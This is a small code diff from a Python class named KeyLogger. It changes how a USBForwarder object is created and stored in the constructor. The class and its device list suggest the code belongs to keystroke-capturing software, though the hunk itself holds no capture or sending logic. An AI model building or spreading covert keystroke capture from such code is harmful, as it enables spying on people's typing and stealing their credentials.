@@ -16,7 +16,7 @@ class KeyLogger:
     def __init__(self, data_handler: DataHandler) -> None:
         self.__devices: list = self.get_devices()
         self.data_handler = data_handler
-        self.__USBForwarder()
+        self.__USBForwarder = USBForwarder()
 
     def __del__(self):
         pass
